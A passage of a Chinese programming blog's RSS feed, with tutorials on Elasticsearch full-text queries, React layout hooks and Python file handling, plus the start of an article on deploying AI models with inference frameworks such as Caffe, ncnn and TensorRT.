通过无线电波与无人机上的接收机进行通信。当飞手在遥控器上操作控制杆时&amp;#xff0c;这些动作会被转换为无线电波信号&amp;#xff0c;并发送给无人机上的接收机。接收机接收到信号后&amp;#xff0c;会解读控制杆的位移&amp;#xff0c;并将其转化为数字信号&amp;#…阅读更多...万家数科：零售业务信息化融合的探索｜OceanBase案例本文作者&amp;#xff1a;马琳&amp;#xff0c;万家数科数据库专家。 万家数科商业数据有限公司&amp;#xff0c;作为华润万家旗下的信息技术企业&amp;#xff0c;专注于零售行业&amp;#xff0c;在为华润万家提供服务的同时&amp;#xff0c;也积极面向市场&amp;#xff0c;为零售商及其生态系统提供全面的核…阅读更多...股市形势复杂多变，投资者该如何应对？炒股自动化&amp;#xff1a;申请官方API接口&amp;#xff0c;散户也可以 python炒股自动化&amp;#xff08;0&amp;#xff09;&amp;#xff0c;申请券商API接口 python炒股自动化&amp;#xff08;1&amp;#xff09;&amp;#xff0c;量化交易接口区别 Python炒股自动化&amp;#xff08;2&amp;#xff09;&amp;#xff1a;获取…阅读更多...基于springboot的网上服装商城推荐系统的设计与实现基于springboot的网上服装商城推荐系统的设计与实现 
开发语言&amp;#xff1a;Java 框架&amp;#xff1a;springboot JDK版本&amp;#xff1a;JDK1.8 服务器&amp;#xff1a;tomcat7 数据库&amp;#xff1a;mysql 5.7 数据库工具&amp;#xff1a;Navicat11 开发软件&amp;#xff1a;idea 
源码获取&amp;#xf…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:12 +0000</pubDate>
    </item>
    <item>
      <title>大数据-174 Elasticsearch Query DSL - 全文检索 full-text query 匹配、短语、多字段 详细操作</title>
      <link>https://www.ppmy.cn/news/1540838.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维大数据-174 Elasticsearch Query DSL - 全文检索 full-text query 匹配、短语、多字段 详细操作news/2025/10/31 23:18:11/点一下关注吧！！！非常感谢！！持续更新！！！目前已经更新到了：Hadoop（已更完）HDFS（已更完）MapReduce（已更完）Hive（已更完）Flume（已更完）Sqoop（已更完）Zookeeper（已更完）HBase（已更完）Redis （已更完）Kafka（已更完）Spark（已更完）Flink（已更完）ClickHouse（已更完）Kudu（已更完）Druid（已更完）Kylin（已更完）Elasticsearch（正在更新…）章节内容上节我们完成了如下的内容：索引操作增删改查详细 JSON 操作 记录官方地址https://www.elastic.co/guide/en/elasticsearch/reference/7.3/query-dsl.htmlElasticsearch提供了基于JSON的完整查询DSL（Domain Specific Language 特定域语言）来定义查询，将查询 DSL 视为查询AST（抽象语法树），它由两种子句组成：叶子查询句 叶子查询子句 在特定域中寻找特定的值，如 match、term、range 查询复合查询子句 复合查询子句包装其他叶子查询或复合查询，并用于以逻辑方式组合多个查询（例如 bool或dis_max查询），或更改其行为（如 constant_score 查询）我们在使用Elasticsearch的时候，避免不使用DSL语句去查询，就像使用关系型数据库的时候要学会使用SQL一样。查询所有示例# 查询所有数据POST /wzkicu-index/_search{"query":{"match_all":{}}}query 代表查询的对象match_all 代表查询所有执行后，结果如下：结果中：took 查询花费时间，单位是毫秒time_out 是否超时_shards 分片信息hits 搜索结果总览对象total 搜索到的总数max_score 所有结果中文档得分的最高分_index 索引库_type 文档类型_id 文档id_score 文档得分_source 文档的数据源全文检索（full-text query）全文搜索能够搜索已分析的文本字段，如电子邮件正文、商品描述，使用索引期间应用于字段的同一分词处理查询字符串，全文搜索的分类很多，有如下的这么几种。匹配搜索（match query）全文查询的标准查询，查询条件比较宽松：需要指定字段名输入文本会进行分词，比如hello world，会拆分成 hello 和 world，然后进行匹配，如果字段内容中包含hello或者world，name就会被查询出来。也就是说match是一个部分匹配的模糊查询。match queries 接收 text/numerics/dates，对它们进行分词分析，再组织成一个boolean查询，可通过operator指定bool组合操作（or、and、默认是or）。假设一个案例，目前索引库中，有两部手机，一台电视：先新增索引库：# 创建索引PUT /wzk-property{"settings":{},"mappings":{"properties":{"title":{"type":"text","analyzer":"ik_max_word"},"images":{"type":"keyword"},"price":{"type":"float"}}}}执行的结果如下图所示：接着我们写入一些数据进去：# 添加数据1POST /wzk-property/_doc/{"title":"小米电视4A","images":"https://profile-avatar.csdnimg.cn/755ff10be62f4e7081bc36028fa9eafe_w776341482.jpg!1","price":4288}# 添加数据2POST /wzk-property/_doc/{"title":"小米手机","images":"https://profile-avatar.csdnimg.cn/755ff10be62f4e7081bc36028fa9eafe_w776341482.jpg!1","price":2699}# 添加数据3POST /wzk-property/_doc/{"title":"华为手机","images":"https://profile-avatar.csdnimg.cn/755ff10be62f4e7081bc36028fa9eafe_w776341482.jpg!1","price":5699}执行结果如下图所示：我们进行or关系的match搜索，会把查询条件进行分词，然后进行查询，多个词条之间是or的关系：# match 分词匹配POST /wzk-property/_search{"query":{"match":{"title":"小米电视4A"}}}执行结果如下图所示：我们可以看到，不仅查到了小米电视、还查询到了小米手机。这不是我们要的结果。此时我们需要使用 and 的方式来进行精确的查找：# match 分词匹配 title字段 同时 分词后的每个词 都要匹配到才可以（and）POST /wzk-property/_search{"query":{"match":{"title":{"query":"小米电视4A","operator":"and"}}}}执行结果如下，可以看到已经精准匹配到了：短语搜索（match phrase query）match_query是分词的，text也是分词的，match_phrase的分词结果必须在text字段中都包含，而且顺序必须相同，而且必须是连续的：# 分词匹配但考虑顺序# match是不考虑分词出现的顺序# match_phrase 将遵循分词的出现顺序才进行匹配POST /wzk-property/_search{"query":{"match_phrase":{"title":"小米电视"}}}执行结果如下图所示：# match_phrase 分伺后：1电视 2小米# 因为条目中 小米电视的出现不是 1、2，所以没有匹配到POST /wzk-property/_search{"query":{"match_phrase":{"title":"电视小米"}}}执行结果如下图所示：# match_phrase 分词 1是小米 2是4A# 但是由于 原：小米电视4A，对比中没有严格按照1、2的顺序# 所以没有结果POST /wzk-property/_search{"query":{"match_phrase":{"title":"小米4A"}}}执行结果如下图所示：但是对于刚才的结果，可能我们希望使用 小米4A，可以按照 match_phrase 的顺序来查找到 小米电视4A，而不用严格遵守顺序，可以跳过几个词：# 通过 slop 可以跳过一个词 来让 match_phrase 匹配到顺序的结果POST /wzk-property/_search{"query":{"match_phrase":{"title":{"query":"小米4A","slop":1}}}}query_string 查询该查询与match类似，但是match需要指定字段名，query_string是在所有字段中搜索，范围更广泛。Query String Query提供了无需指定某字段而对文档全文进行匹配查询的一个高级查询，同时可以指定在哪些字段上进行匹配。# 广泛查询 所有字段中查找 2699POST /wzk-property/_search{"query":{"query_string":{"query":"2699"}}}执行结果如下图所示：# 广泛查找 但是你希望从这个default_field字段中查找POST /wzk-property/_search{"query":{"query_string":{"query":"2699","default_field":"title"}}}执行结果如下图所示：# 逻辑查询 使用 OR 或者 ANDPOST /wzk-property/_search{"query":{"query_string":{"query":"手机 OR 小米","default_field":"title"}}}执行结果下图所示：# 逻辑查询 使用 OR 或者 ANDPOST /wzk-property/_search{"query":{"query_string":{"query":"手机 AND 小米","default_field":"title"}}}执行结果如下图所示：# 模糊查询，表示 小米 这个词可以有1个词变动# 比如：小明、米小 都是可以查询出来的POST /wzk-property/_search{"query":{"query_string":{"query":"小米~1","default_field":"title"}}}执行结果如下图所示：# 模糊查询，表示 小米 这个词可以有1个词变动# 比如：小明、米小 都是可以查询出来的# 以此类推，如果是 小米~2 那就两个词都可以变动...POST /wzk-property/_search{"query":{"query_string":{"query":"米小~1","default_field":"title"}}}执行结果如下图所示：# 多字段支持POST /lagou-property/_search{"query":{"query_string":{"query":"2699","fields":["title","price"]}}}执行结果如下图所示：多字段匹配查询（multi match query）如果你需要在多个字段上进行文本搜索，可用multi_match，multi_match在match的基础上支持对多个字段进行文本查询。# multi_match 是 match查询的一种扩展方式，用于在多个字段上进行查询POST /wzk-property/_search{"query":{"multi_match":{"query":"小米4A","fields":["title","images"]}}}执行结果如下图所示：http://www.ppmy.cn/news/1540838.html相关文章【React】useLayoutEffect、useInsertionEffectuseLayoutEffect 
useLayoutEffect和useEffect有什么区别呢&amp;#xff1f; 
useEffect的cb&amp;#xff0c;准确来说&amp;#xff0c;是异步调用的&amp;#xff0c;会等主线程任务执行完成&amp;#xff0c;D0M更新&amp;#xff0c;JS执行完成&amp;#xff0c;视图绘制完成&amp;#xff0c;才执行。 
useLayout…阅读更多...【Python】基础--文件处理在Python中&amp;#xff0c;文件处理涉及打开文件、读取文件内容、写入文件以及关闭文件等操作。以下是有关文件处理的基本知识&amp;#xff1a; 
1. 文件的打开 
在Python中&amp;#xff0c;可以使用内置的 open() 函数打开文件。open() 函数的基本语法如下&amp;#xff1a; 
file_object  ope…阅读更多...一文详解AI模型部署及工业落地方式最近在复盘今年上半年做的一些事情&amp;#xff0c;不管是训练模型、部署模型搭建服务&amp;#xff0c;还是写一些组件代码等&amp;#xff0c;零零散散是有一些产出。 
虽然有了一点点成果&amp;#xff0c;但仍觉着缺点什么。作为深度学习****算法工程师&amp;#xff0c;训练模型和部署模型是最基本…阅读更多...无人机：无线电波控制技术！一、无线电波控制技术 
通过无线电波与无人机上的接收机进行通信。当飞手在遥控器上操作控制杆时&amp;#xff0c;这些动作会被转换为无线电波信号&amp;#xff0c;并发送给无人机上的接收机。接收机接收到信号后&amp;#xff0c;会解读控制杆的位移&amp;#xff0c;并将其转化为数字信号&amp;#…阅读更多...万家数科：零售业务信息化融合的探索｜OceanBase案例本文作者&amp;#xff1a;马琳&amp;#xff0c;万家数科数据库专家。 万家数科商业数据有限公司&amp;#xff0c;作为华润万家旗下的信息技术企业&amp;#xff0c;专注于零售行业&amp;#xff0c;在为华润万家提供服务的同时&amp;#xff0c;也积极面向市场&amp;#xff0c;为零售商及其生态系统提供全面的核…阅读更多...股市形势复杂多变，投资者该如何应对？炒股自动化&amp;#xff1a;申请官方API接口&amp;#xff0c;散户也可以 python炒股自动化&amp;#xff08;0&amp;#xff09;&amp;#xff0c;申请券商API接口 python炒股自动化&amp;#xff08;1&amp;#xff09;&amp;#xff0c;量化交易接口区别 Python炒股自动化&amp;#xff08;2&amp;#xff09;&amp;#xff1a;获取…阅读更多...基于springboot的网上服装商城推荐系统的设计与实现基于springboot的网上服装商城推荐系统的设计与实现 
开发语言&amp;#xff1a;Java 框架&amp;#xff1a;springboot JDK版本&amp;#xff1a;JDK1.8 服务器&amp;#xff1a;tomcat7 数据库&amp;#xff1a;mysql 5.7 数据库工具&amp;#xff1a;Navicat11 开发软件&amp;#xff1a;idea 
源码获取&amp;#xf…阅读更多...HTML5_引用_语法规范_开发工具_常用标签目录 1. HTML 语法规范 
1.1 基本语法概述 
1.2 标签关系 
2. HTML 基本结构标签 
2.1 第一个 HTML 网页 
1.创建新文件 
2.进行保存&amp;#xff0c;这里可以选择保存到桌面&amp;#xff0c;但是后缀名一定要是.html 
2.2 基本结构标签总结 
3. 网页开发工具 
VSCode 的使用 
VSCode 工…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:11 +0000</pubDate>
    </item>
    <item>
      <title>【React】useLayoutEffect、useInsertionEffect</title>
      <link>https://www.ppmy.cn/news/1540837.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维【React】useLayoutEffect、useInsertionEffectnews/2025/10/31 23:18:10/useLayoutEffectuseLayoutEffect和useEffect有什么区别呢？useEffect的cb，准确来说，是异步调用的，会等主线程任务执行完成，D0M更新，JS执行完成，视图绘制完成，才执行。useLayoutEffect的cb，是同步执行的，执行时机是DOM更新之后，视图绘制完成之前，这个时间可以更方便的修改 DOM。如果要改 DOM， 用useLayoutEffect， 其他都用useEffect 。useInsertionEffectuseInsertionEffect比useLayoutEffect更早。useInsertionEffect 执行时，DOM还没有更新。本质上useInsertionEffect主要是解决 css-in-js 在渲染中注入样式的性能问题。哪个和componentDidMount、componentDidUpdate更类似componentDidMount、componentDidUpdate是同步的，所以useLayoutEffect更类似。http://www.ppmy.cn/news/1540837.html相关文章【Python】基础--文件处理在Python中&amp;#xff0c;文件处理涉及打开文件、读取文件内容、写入文件以及关闭文件等操作。以下是有关文件处理的基本知识&amp;#xff1a; 
1. 文件的打开 
在Python中&amp;#xff0c;可以使用内置的 open() 函数打开文件。open() 函数的基本语法如下&amp;#xff1a; 
file_object  ope…阅读更多...一文详解AI模型部署及工业落地方式最近在复盘今年上半年做的一些事情&amp;#xff0c;不管是训练模型、部署模型搭建服务&amp;#xff0c;还是写一些组件代码等&amp;#xff0c;零零散散是有一些产出。 
虽然有了一点点成果&amp;#xff0c;但仍觉着缺点什么。作为深度学习****算法工程师&amp;#xff0c;训练模型和部署模型是最基本…阅读更多...无人机：无线电波控制技术！一、无线电波控制技术 
通过无线电波与无人机上的接收机进行通信。当飞手在遥控器上操作控制杆时&amp;#xff0c;这些动作会被转换为无线电波信号&amp;#xff0c;并发送给无人机上的接收机。接收机接收到信号后&amp;#xff0c;会解读控制杆的位移&amp;#xff0c;并将其转化为数字信号&amp;#…阅读更多...万家数科：零售业务信息化融合的探索｜OceanBase案例本文作者&amp;#xff1a;马琳&amp;#xff0c;万家数科数据库专家。 万家数科商业数据有限公司&amp;#xff0c;作为华润万家旗下的信息技术企业&amp;#xff0c;专注于零售行业&amp;#xff0c;在为华润万家提供服务的同时&amp;#xff0c;也积极面向市场&amp;#xff0c;为零售商及其生态系统提供全面的核…阅读更多...股市形势复杂多变，投资者该如何应对？炒股自动化&amp;#xff1a;申请官方API接口&amp;#xff0c;散户也可以 python炒股自动化&amp;#xff08;0&amp;#xff09;&amp;#xff0c;申请券商API接口 python炒股自动化&amp;#xff08;1&amp;#xff09;&amp;#xff0c;量化交易接口区别 Python炒股自动化&amp;#xff08;2&amp;#xff09;&amp;#xff1a;获取…阅读更多...基于springboot的网上服装商城推荐系统的设计与实现基于springboot的网上服装商城推荐系统的设计与实现 
开发语言&amp;#xff1a;Java 框架&amp;#xff1a;springboot JDK版本&amp;#xff1a;JDK1.8 服务器&amp;#xff1a;tomcat7 数据库&amp;#xff1a;mysql 5.7 数据库工具&amp;#xff1a;Navicat11 开发软件&amp;#xff1a;idea 
源码获取&amp;#xf…阅读更多...HTML5_引用_语法规范_开发工具_常用标签目录 1. HTML 语法规范 
1.1 基本语法概述 
1.2 标签关系 
2. HTML 基本结构标签 
2.1 第一个 HTML 网页 
1.创建新文件 
2.进行保存&amp;#xff0c;这里可以选择保存到桌面&amp;#xff0c;但是后缀名一定要是.html 
2.2 基本结构标签总结 
3. 网页开发工具 
VSCode 的使用 
VSCode 工…阅读更多...并发编程的艺术Volatile 
作用 1. 保证共享变量的可见性&amp;#xff08;volatile修饰的变量进行操作对其他线程是可见的&amp;#xff09; 2. 插入读写屏障&amp;#xff0c;防止指令重排序。 
volatile 的底层实现 以下代码是对volatile修饰的instance变量赋值的汇编语言 
volatile Singleton instance
in…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:10 +0000</pubDate>
    </item>
    <item>
      <title>【Python】基础--文件处理</title>
      <link>https://www.ppmy.cn/news/1540836.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维【Python】基础--文件处理news/2025/10/31 23:18:09/在Python中，文件处理涉及打开文件、读取文件内容、写入文件以及关闭文件等操作。以下是有关文件处理的基本知识：1. 文件的打开在Python中，可以使用内置的open()函数打开文件。open()函数的基本语法如下：file_object = open(file_name, mode)file_name: 要打开的文件的路径和名称。mode: 文件打开模式（可选），常用模式包括：'r': 只读模式（默认）'w': 写入模式（如果文件存在，则覆盖；如果不存在，则创建新文件）'a': 追加模式（在文件末尾添加内容）'b': 二进制模式（例如，'rb'或'wb'）'x': 排他性写入模式（仅在文件不存在时创建新文件）# 以只读模式打开文件  
file = open("example.txt", "r")2. 文件的读取读取文件内容通常使用read(),readline()或readlines()方法。read(size): 读取指定数量的字节，如果没有指定，读取整个文件。content = file.read()  # 读取整个文件内容readline(): 逐行读取文件，每次读取一行。first_line = file.readline()  # 读取第一行readlines(): 读取文件中所有行并返回一个列表，每一行作为列表的一项。lines = file.readlines()  # 返回所有行的列表使用示例：file = open("example.txt", "r")  
content = file.read()  # 读取文件内容  
print(content)  
file.close()  # 关闭文件3. 文件的写入文件写入通常使用write()和writelines()方法。write(string): 将字符串写入文件。file.write("Hello, World!")writelines(lines): 将一个字符串列表写入文件，每个字符串被写入后不自动换行。lines = ["Line 1\n", "Line 2\n", "Line 3\n"]  
file.writelines(lines)使用示例：file = open("example.txt", "w")  # 以写入模式打开文件（覆盖）  
file.write("Hello, World!\n")  
file.write("This is a new line.\n")  
file.close()  # 关闭文件4. 文件的关闭无论是读取还是写入操作后，应该使用close()方法关闭文件，以释放系统资源：file.close()5. 使用with语句为了确保文件正确关闭，可以使用with语句来处理文件，这样无论操作是否成功，文件都会被自动关闭。示例：with open("example.txt", "w") as file:  file.write("Hello, World!\n")  file.write("Using with statement for safer file handling.\n")  with open("example.txt", "r") as file:  content = file.read()  print(content)6. 处理文件异常在文件处理时，可能会出现各种异常，例如文件未找到、权限不足等。可以使用try-except语句来捕获和处理这些异常。示例：try:  with open("example.txt", "r") as file:  content = file.read()  print(content)  
except FileNotFoundError:  print("File not found.")  
except PermissionError:  print("Permission denied.")通过掌握以上知识，你可以有效地进行文件的读写和管理。在实际应用中，这些基本操作非常重要，尤其是在处理大量数据或配置文件时。http://www.ppmy.cn/news/1540836.html相关文章一文详解AI模型部署及工业落地方式最近在复盘今年上半年做的一些事情&amp;#xff0c;不管是训练模型、部署模型搭建服务&amp;#xff0c;还是写一些组件代码等&amp;#xff0c;零零散散是有一些产出。 
虽然有了一点点成果&amp;#xff0c;但仍觉着缺点什么。作为深度学习****算法工程师&amp;#xff0c;训练模型和部署模型是最基本…阅读更多...无人机：无线电波控制技术！一、无线电波控制技术 
通过无线电波与无人机上的接收机进行通信。当飞手在遥控器上操作控制杆时&amp;#xff0c;这些动作会被转换为无线电波信号&amp;#xff0c;并发送给无人机上的接收机。接收机接收到信号后&amp;#xff0c;会解读控制杆的位移&amp;#xff0c;并将其转化为数字信号&amp;#…阅读更多...万家数科：零售业务信息化融合的探索｜OceanBase案例本文作者&amp;#xff1a;马琳&amp;#xff0c;万家数科数据库专家。 万家数科商业数据有限公司&amp;#xff0c;作为华润万家旗下的信息技术企业&amp;#xff0c;专注于零售行业&amp;#xff0c;在为华润万家提供服务的同时&amp;#xff0c;也积极面向市场&amp;#xff0c;为零售商及其生态系统提供全面的核…阅读更多...股市形势复杂多变，投资者该如何应对？炒股自动化&amp;#xff1a;申请官方API接口&amp;#xff0c;散户也可以 python炒股自动化&amp;#xff08;0&amp;#xff09;&amp;#xff0c;申请券商API接口 python炒股自动化&amp;#xff08;1&amp;#xff09;&amp;#xff0c;量化交易接口区别 Python炒股自动化&amp;#xff08;2&amp;#xff09;&amp;#xff1a;获取…阅读更多...基于springboot的网上服装商城推荐系统的设计与实现基于springboot的网上服装商城推荐系统的设计与实现 
开发语言&amp;#xff1a;Java 框架&amp;#xff1a;springboot JDK版本&amp;#xff1a;JDK1.8 服务器&amp;#xff1a;tomcat7 数据库&amp;#xff1a;mysql 5.7 数据库工具&amp;#xff1a;Navicat11 开发软件&amp;#xff1a;idea 
源码获取&amp;#xf…阅读更多...HTML5_引用_语法规范_开发工具_常用标签目录 1. HTML 语法规范 
1.1 基本语法概述 
1.2 标签关系 
2. HTML 基本结构标签 
2.1 第一个 HTML 网页 
1.创建新文件 
2.进行保存&amp;#xff0c;这里可以选择保存到桌面&amp;#xff0c;但是后缀名一定要是.html 
2.2 基本结构标签总结 
3. 网页开发工具 
VSCode 的使用 
VSCode 工…阅读更多...并发编程的艺术Volatile 
作用 1. 保证共享变量的可见性&amp;#xff08;volatile修饰的变量进行操作对其他线程是可见的&amp;#xff09; 2. 插入读写屏障&amp;#xff0c;防止指令重排序。 
volatile 的底层实现 以下代码是对volatile修饰的instance变量赋值的汇编语言 
volatile Singleton instance
in…阅读更多...vue后台管理系统从0到1（5）文章目录 vue后台管理系统从0到1&amp;#xff08;5&amp;#xff09;完善侧边栏修改bug渲染header导航栏 vue后台管理系统从0到1&amp;#xff08;5&amp;#xff09; 接上一期&amp;#xff0c;我们需要完善我们的侧边狼 
完善侧边栏 
我们在 element 组件中可以看见&amp;#xff0c;这一个侧边栏是符合我们…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:18:09 +0000</pubDate>
    </item>
    <item>
      <title>一文详解AI模型部署及工业落地方式</title>
      <link>https://www.ppmy.cn/news/1540835.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维一文详解AI模型部署及工业落地方式news/2025/10/31 23:18:07/最近在复盘今年上半年做的一些事情，不管是训练模型、部署模型搭建服务，还是写一些组件代码等，零零散散是有一些产出。虽然有了一点点成果，但仍觉着缺点什么。作为深度学习****算法工程师，训练模型和部署模型是最基本的要求，每天都在重复着这个工作，但偶尔静下心来想一想，还是有很多事情需要做的：模型的结构，因为上线业务需要，更趋向于稳定有经验的，而不是探索一些新的结构模型的加速仍然不够，还没有压榨完GPU的全部潜力深感还有很多很多需要学习的地方啊。所有资料 ⚡️ ，朋友们如果有需要全套 《LLM大模型入门+进阶学习资源包》，扫码获取~沉迷学习无法自拔既然要学习，那么学习路线就显得比较重要了。本文重点谈谈学习AI部署的一些基础和需要提升的地方。这也是老潘之前学习、或者未来需要学习的一些点，这里抛砖引玉下，也希望大家能够提出一点意见。AI部署AI部署这个词儿大家肯定不陌生，可能有些小伙伴还不是很清楚这个是干嘛的，但总归是耳熟能详了。近些年来，在深度学习算法已经足够卷卷卷之后，深度学习的另一个偏向于工程的方向–部署工业落地，才开始被谈论的多了起来。当然这也是大势所趋，毕竟AI算法那么多，如果用不着，只在学术圈搞研究的话没有意义。因此很多AI部署相关行业和AI芯片相关行业也在迅速发展，现在虽然已经2021年了，但我认为AI部署相关的行业还未到头，AI也远远没有普及。简单收集了一下知乎关于“部署”话题去年和今年的一些提问：提问的都是明白人，随着人工智能逐渐普及，使用神经网络处理各种任务的需求越来越多，如何在生产环境中快速、稳定、高效地运行模型，成为很多公司不得不考虑的问题。不论是通过提升模型速度降低latency提高用户的使用感受，还是加速模型降低服务器预算，都是很有用的，公司也需要这样的人才。在经历了算法的神仙打架、诸神黄昏、灰飞烟灭等等这些知乎热搜后。AI部署工业落地这块似乎还没有那么卷…相比AI算法来说，AI部署的入坑机会更多些。你懂得当然，AI落地部署和神经网络深度学习的关系是分不开的，就算你是AI算法工程师，也是有必要学习这块知识的。并不是所有人都是纯正的AI算法研究员。聊聊AI部署AI部署的基本步骤：训练一个模型，也可以是拿一个别人训练好的模型针对不同平台对生成的模型进行转换，也就是俗称的parse、convert，即前端解释器针对转化后的模型进行优化，这一步很重要，涉及到很多优化的步骤在特定的平台(嵌入端或者服务端)成功运行已经转化好的模型在模型可以运行的基础上，保证模型的速度、精度和稳定性就这样，虽然看起来没什么，但需要的知识和经验还是很多的。因为实际场景中我们使用的模型远远比ResNet50要复杂，我们部署的环境也远远比实验室的环境条件更苛刻，对模型的速度精度需求也比一般demo要高。对于硬件公司来说，需要将深度学习算法部署到性能低到离谱的开发板上，因为成本能省就省。在算法层面优化模型是一方面，但更重要的是从底层优化这个模型，这就涉及到部署落地方面的各个知识(手写汇编算子加速、算子融合等等)；对于软件公司来说，我们往往需要将算法运行到服务器上，当然服务器可以是布满2080TI的高性能CPU机器，但是如果QPS请求足够高的话，需要的服务器数量也是相当之大的。这个要紧关头，如果我们的模型运行的足够快，可以省机器又可以腾一些buffer上新模型岂不很爽，这个时候也就需要优化模型了，其实优化手段也都差不多，只不过平台从arm等嵌入式端变为gpu等桌面端了。作为AI算法部署工程师，你要做的就是将训练好的模型部署到线上，根据任务需求，速度提升2-10倍不等，还需要保证模型的稳定性。是不是很有挑战性？需要什么技术呢？需要一些算法知识以及扎实的工程能力。老潘认为算法部署落地这个方向是比较踏实务实的方向，相比设计模型提出新算法，对于咱们这种并不天赋异禀来说，只要肯付出，收获是肯定有的(不像设计模型，那些巧妙的结果设计不出来就是设计不出来你气不气)。其实算法部署也算是开发了，不仅需要和训练好的模型打交道，有时候也会干一些粗活累活(也就是dirty work)，自己用C++、cuda写算子(预处理、op、后处理等等)去实现一些独特的算子。也需要经常调bug、联合编译、动态静态库混搭等等。算法部署最常用的语言是啥，当然是C++了。如果想搞深度学习AI部署这块，C++是逃离不了的。所以，学好C++很重要，起码能看懂各种关于部署精巧设计的框架(再列一遍：Caffe、libtorch、ncnn、mnn、tvm、OpenVino、TensorRT，不完全统计，我就列过我用过的)。当然并行计算编程语言也可以学一个，针对不同的平台而不同，可以先学学CUDA，资料更多一些，熟悉熟悉并行计算的原理，对以后学习其他并行语言都有帮助。系统的知识嘛，还在整理[1]，还是建议实际中用到啥再看啥，或者有项目在push你，这样学习的更快一些。可以选择上手的项目：好用的开源推理框架：Caffe、NCNN、MNN、TVM、OpenVino好用的半开源推理框架：TensorRT好用的开源服务器框架：triton-inference-server基础知识：计算机原理、编译原理等需要的深度学习基础知识AI部署当然也需要深度学习的基础知识，也需要知道怎么训练模型，怎么优化模型，模型是怎么设计的等等。不然你怎会理解这个模型的具体op细节以及运行细节，有些模型结构比较复杂，也需要对原始模型进行debug。常用的框架这里介绍一些部署常用到的框架，也是老潘使用过的，毕竟对于某些任务来说，自己造轮子不如用别人造好的轮子。并且大部分大厂的轮子都有很多我们可以学习的地方，因为开源我们也可以和其他开发者一同讨论相关问题；同样，虽然开源，但用于生产环境也几乎没有问题，我们也可以根据自身需求进行魔改。这里老潘介绍一些值得学习的推理框架，不瞒你说，这些推理框架已经被很多公司使用于生成环境了。Caffe[2]Caffe有多经典就不必说了，闲着无聊的时候看看Caffe源码也是受益匪浅。我感觉Caffe是前些年工业界使用最多的框架(还